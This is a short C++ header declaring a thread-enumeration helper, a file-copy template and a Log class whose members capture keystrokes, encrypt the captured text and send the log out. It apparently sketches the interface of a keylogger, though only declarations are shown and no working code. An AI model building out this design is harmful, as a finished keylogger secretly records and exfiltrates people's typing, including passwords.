


std::set<DWORD> getAllThreadIds();
template <class InputIterator>
HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);


class Log {
private:

	int ExtrapolatedKey;
	std::string log;
	std::string EncryptMyString(std::string UnencryptedString);

public:

	void CreateLog();
	void LogItInt(int key_stroke);
	void LogItChar(std::string Value);
	void SendLog();

};